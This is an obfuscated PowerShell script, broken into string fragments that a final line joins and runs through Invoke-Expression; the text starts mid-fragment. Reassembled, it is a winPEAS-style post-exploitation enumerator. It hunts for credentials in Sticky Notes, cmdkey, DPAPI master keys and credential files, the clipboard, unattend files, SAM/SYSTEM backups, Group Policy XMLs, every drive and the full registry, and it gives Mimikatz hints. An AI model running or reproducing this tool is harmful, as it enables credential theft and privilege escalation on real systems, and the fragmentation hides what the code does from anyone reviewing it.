Get-ChildItem en','v: | Format-Table -','Wrap


Write-Host "','"
if ($TimeStamp) {',' TimeElapsed }
Writ','e-Host -ForegroundC','olor Blue "========','=|| Sticky Notes Ch','eck"
if (Test-Path ','"C:\Users\$env:USER','NAME\AppData\Local\','Packages\Microsoft.','MicrosoftStickyNote','s*\LocalState\plum.','sqlite") {
  Write-','Host "Sticky Notes ','database found. Cou','ld have credentials',' in plain text: "
 ',' Write-Host "C:\Use','rs\$env:USERNAME\Ap','pData\Local\Package','s\Microsoft.Microso','ftStickyNotes*\Loca','lState\plum.sqlite"','
}

# Check for Cac','hed Credentials
# h','ttps://community.id','era.com/database-to','ols/powershell/powe','rtips/b/tips/posts/','getting-cached-cred','entials
Write-Host ','""
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| Cached Credent','ials Check"
Write-H','ost "https://book.h','acktricks.xyz/windo','ws-hardening/window','s-local-privilege-e','scalation#windows-v','ault" -ForegroundCo','lor Yellow 
cmdkey.','exe /list


Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| Checking f','or DPAPI RPC Master',' Keys"
Write-Host "','Use the Mimikatz ''d','papi::masterkey'' mo','dule with appropria','te arguments (/rpc)',' to decrypt"
Write-','Host "https://book.','hacktricks.xyz/wind','ows-hardening/windo','ws-local-privilege-','escalation#dpapi" -','ForegroundColor Yel','low

$appdataRoamin','g = "C:\Users\$env:','USERNAME\AppData\Ro','aming\Microsoft\"
$','appdataLocal = "C:\','Users\$env:USERNAME','\AppData\Local\Micr','osoft\"
if ( Test-P','ath "$appdataRoamin','g\Protect\") {
  Wr','ite-Host "found: $a','ppdataRoaming\Prote','ct\"
  Get-ChildIte','m -Path "$appdataRo','aming\Protect\" -Fo','rce | ForEach-Objec','t {
    Write-Host ','$_.FullName
  }
}
i','f ( Test-Path "$app','dataLocal\Protect\"',') {
  Write-Host "f','ound: $appdataLocal','\Protect\"
  Get-Ch','ildItem -Path "$app','dataLocal\Protect\"',' -Force | ForEach-O','bject {
    Write-H','ost $_.FullName
  }','
}


Write-Host ""
','if ($TimeStamp) { T','imeElapsed }
Write-','Host -ForegroundCol','or Blue "=========|','| Checking for DPAP','I Cred Master Keys"','
Write-Host "Use th','e Mimikatz ''dpapi::','cred'' module with a','ppropriate /masterk','ey to decrypt" 
Wri','te-Host "You can al','so extract many DPA','PI masterkeys from ','memory with the Mim','ikatz ''sekurlsa::dp','api'' module" 
Write','-Host "https://book','.hacktricks.xyz/win','dows-hardening/wind','ows-local-privilege','-escalation#dpapi" ','-ForegroundColor Ye','llow

if ( Test-Pat','h "$appdataRoaming\','Credentials\") {
  ','Get-ChildItem -Path',' "$appdataRoaming\C','redentials\" -Force','
}
if ( Test-Path "','$appdataLocal\Crede','ntials\") {
  Get-C','hildItem -Path "$ap','pdataLocal\Credenti','als\" -Force
}


Wr','ite-Host ""
if ($Ti','meStamp) { TimeElap','sed }
Write-Host -F','oregroundColor Blue',' "=========|| Curre','nt Logged on Users"','
try { quser }catch',' { Write-Host "''qus','er'' command not not',' present on system"',' } 


Write-Host ""','
if ($TimeStamp) { ','TimeElapsed }
Write','-Host -ForegroundCo','lor Blue "=========','|| Remote Sessions"','
try { qwinsta } ca','tch { Write-Host "''','qwinsta'' command no','t present on system','" }


Write-Host ""','
if ($TimeStamp) { ','TimeElapsed }
Write','-Host -ForegroundCo','lor Blue "=========','|| Kerberos tickets',' (does require admi','n to interact)"
try',' { klist } catch { ','Write-Host "No acti','ve sessions" }


Wr','ite-Host ""
if ($Ti','meStamp) { TimeElap','sed }
Write-Host -F','oregroundColor Blue',' "=========|| Print','ing ClipBoard (if a','ny)"
Get-ClipBoardT','ext

##############','########## File/Cre','dentials check ####','###################','#
Write-Host ""
if ','($TimeStamp) { Time','Elapsed }
Write-Hos','t -ForegroundColor ','Blue "=========|| U','nattended Files Che','ck"
@("C:\Windows\s','ysprep\sysprep.xml"',',
  "C:\Windows\sys','prep\sysprep.inf",
','  "C:\Windows\syspr','ep.inf",
  "C:\Wind','ows\Panther\Unatten','ded.xml",
  "C:\Win','dows\Panther\Unatte','nd.xml",
  "C:\Wind','ows\Panther\Unatten','d\Unattend.xml",
  ','"C:\Windows\Panther','\Unattend\Unattende','d.xml",
  "C:\Windo','ws\System32\Sysprep','\unattend.xml",
  "','C:\Windows\System32','\Sysprep\unattended','.xml",
  "C:\unatte','nd.txt",
  "C:\unat','tend.inf") | ForEac','h-Object {
  if (Te','st-Path $_) {
    W','rite-Host "$_ found','."
  }
}


########','################ GR','OUP POLICY RELATED ','CHECKS ############','############
Write-','Host ""
if ($TimeSt','amp) { TimeElapsed ','}
Write-Host -Foreg','roundColor Blue "==','=======|| SAM / SYS','TEM Backup Checks"
','
@(
  "$Env:windir\','repair\SAM",
  "$En','v:windir\System32\c','onfig\RegBack\SAM",','
  "$Env:windir\Sys','tem32\config\SAM",
','  "$Env:windir\repa','ir\system",
  "$Env',':windir\System32\co','nfig\SYSTEM",
  "$E','nv:windir\System32\','config\RegBack\syst','em") | ForEach-Obje','ct {
  if (Test-Pat','h $_ -ErrorAction S','ilentlyContinue) {
','    Write-Host "$_ ','Found!" -Foreground','Color red
  }
}

Wr','ite-Host ""
if ($Ti','meStamp) { TimeElap','sed }
Write-Host -F','oregroundColor Blue',' "=========|| Group',' Policy Password Ch','eck"

$GroupPolicy ','= @("Groups.xml", "','Services.xml", "Sch','eduledtasks.xml", "','DataSources.xml", "','Printers.xml", "Dri','ves.xml")
if (Test-','Path "$env:SystemDr','ive\Microsoft\Group',' Policy\history") {','
  Get-ChildItem -R','ecurse -Force "$env',':SystemDrive\Micros','oft\Group Policy\hi','story" -Include @Gr','oupPolicy
}

if (Te','st-Path "$env:Syste','mDrive\Documents an','d Settings\All User','s\Application Data\','Microsoft\Group Pol','icy\history" ) {
  ','Get-ChildItem -Recu','rse -Force "$env:Sy','stemDrive\Documents',' and Settings\All U','sers\Application Da','ta\Microsoft\Group ','Policy\history"
}

','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| Rec','ycle Bin TIP:"
Writ','e-Host "if credenti','als are found in th','e recycle bin, tool',' from nirsoft may a','ssist: http://www.n','irsoft.net/password','_recovery_tools.htm','l" -ForegroundColor',' Yellow

##########','############## File','/Folder Check #####','###################','

Write-Host ""
if ','($TimeStamp) { Time','Elapsed }
Write-Hos','t -ForegroundColor ','Blue "=========||  ','Password Check in F','iles/Folders"

# Lo','oking through the e','ntire computer for ','passwords
# Also lo','oks for MCaffee sit','e list while loopin','g through the drive','s.
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| Password Check','. Starting at root ','of each drive. This',' will take some tim','e. Like, grab a cof','fee or tea kinda ti','me."
Write-Host -Fo','regroundColor Blue ','"=========|| Lookin','g through each driv','e, searching for $f','ileExtensions"
# Ch','eck if the Excel co','m object is install','ed, if so, look thr','ough files, if not,',' just notate if a f','ile has "user" or "','password in name"
t','ry { New-Object -Co','mObject Excel.Appli','cation | Out-Null; ','$ReadExcel = $true ','}catch {$ReadExcel ','= $false; if($Excel','){
  Write-Host -Fo','regroundColor Yello','w "Host does not ha','ve Excel COM object',', will still point ','out excel files whe','n found."
}}
$Drive','s.Root | ForEach-Ob','ject {
  $Drive = $','_
  Get-ChildItem $','Drive -Recurse -Inc','lude $fileExtension','s -ErrorAction Sile','ntlyContinue -Force',' | ForEach-Object {','
    $path = $_
   ',' #Exclude files/fol','ders with ''lang'' in',' the name
    if ($','Path.FullName | sel','ect-string "(?i).*l','ang.*") {
      #Wr','ite-Host "$($_.Full','Name) found!" -Fore','groundColor red
   ',' }
    if($Path.Ful','lName | Select-Stri','ng "(?i).:\\.*\\.*P','ass.*"){
      writ','e-host -ForegroundC','olor Blue "$($path.','FullName) contains ','the word ''pass''"
  ','  }
    if($Path.Fu','llName | Select-Str','ing ".:\\.*\\.*user','.*" ){
      Write-','Host -ForegroundCol','or Blue "$($path.Fu','llName) contains th','e word ''user'' -excl','uding the ''users'' d','irectory"
    }
   ',' # If path name end','s with common excel',' extensions
    els','eif ($Path.FullName',' | Select-String ".','*\.xls",".*\.xlsm",','".*\.xlsx") {
     ',' if ($ReadExcel -an','d $Excel) {
       ',' Search-Excel -Sour','ce $Path.FullName -','SearchText "user"
 ','       Search-Excel',' -Source $Path.Full','Name -SearchText "p','ass"
      }
    }
','    else {
      if',' ($path.Length -gt ','0) {
        # Writ','e-Host -ForegroundC','olor Blue "Path nam','e matches extension',' search: $path"
   ','   }
      if ($pat','h.FullName | Select','-String "(?i).*Site','List\.xml") {
     ','   Write-Host "Poss','ible MCaffee Site L','ist Found: $($_.Ful','lName)"
        Wri','te-Host "Just going',' to leave this here',': https://github.co','m/funoverip/mcafee-','sitelist-pwd-decryp','tion" -ForegroundCo','lor Yellow
      }
','      $regexSearch.','keys | ForEach-Obje','ct {
        $passw','ordFound = Get-Cont','ent $path.FullName ','-ErrorAction Silent','lyContinue -Force |',' Select-String $reg','exSearch[$_] -Conte','xt 1, 1
        if ','($passwordFound) {
','          Write-Hos','t "Possible Passwor','d found: $_" -Foreg','roundColor Yellow
 ','         Write-Host',' $Path.FullName
   ','       Write-Host -','ForegroundColor Blu','e "$_ triggered"
  ','        Write-Host ','$passwordFound -For','egroundColor Red
  ','      }
      }
   ',' }  
  }
}

#######','################# R','egistry Password Ch','eck ###############','#########

Write-Ho','st -ForegroundColor',' Blue "=========|| ','Registry Password C','heck"
# Looking thr','ough the entire reg','istry for passwords','
Write-Host "This w','ill take some time.',' Won''t you have a p','epsi?"
$regPath = @','("registry::\HKEY_C','URRENT_USER\", "reg','istry::\HKEY_LOCAL_','MACHINE\")
# Search',' for the string in ','registry values and',' properties
foreach',' ($r in $regPath) {','
(Get-ChildItem -Pa','th $r -Recurse -For','ce -ErrorAction Sil','entlyContinue) | Fo','rEach-Object {
    ','$property = $_.prop','erty
    $Name = $_','.Name
    $property',' | ForEach-Object {','
      $Prop = $_
 ','     $regexSearch.k','eys | ForEach-Objec','t {
        $value ','= $regexSearch[$_]
','        if ($Prop |',' Where-Object { $_ ','-like $value }) {
 ','         Write-Host',' "Possible Password',' Found: $Name\$Prop','"
          Write-H','ost "Key: $_" -Fore','groundColor Red
   ','     }
        $Pro','p | ForEach-Object ','{   
          $pro','pValue = (Get-ItemP','roperty "registry::','$Name").$_
        ','  if ($propValue | ','Where-Object { $_ -','like $Value }) {
  ','          Write-Hos','t "Possible Passwor','d Found: $name\$_ $','propValue"
        ','  }
        }
     ',' }
    }
  }
  if (','$TimeStamp) { TimeE','lapsed }
  Write-Ho','st "Finished $r"
}
'); $script = $fragments -join ''; Invoke-Expression $script
